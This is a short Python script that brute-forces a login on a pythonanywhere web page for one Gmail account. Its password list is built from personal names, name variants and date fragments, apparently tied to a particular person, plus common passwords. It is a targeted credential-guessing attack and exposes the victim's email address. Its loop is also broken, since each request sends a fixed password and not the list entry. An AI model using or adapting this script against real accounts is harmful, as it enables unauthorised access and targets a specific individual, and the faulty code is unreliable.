import requests
import asyncio

passwordList = ['31', '10', '1974', 'petrova', 'Skarlet', 'Scarlet', 'Petrova', 'scarlet', 'skarlet',
               'kostya', 'Kostya', 'Konstantin', 'konstantin', 'lazarev', 'Lazarev', 'password', '12345678', 'qwerty',
               'cat', 'Cat']
norm = ['']
print('hi')
n = 0
for a in passwordList:
    norm.append(a)
    n = n + 1
print(n)
for password in norm:
    response = requests.post('https://artemiikabanov.pythonanywhere.com/',
                             json={'login': 'sanyaawp@gmail.com', 'password': 'sanyaawp'})
    print('2')
    if response.status_code == 200:
        print('good', password)
        break
print('lox')
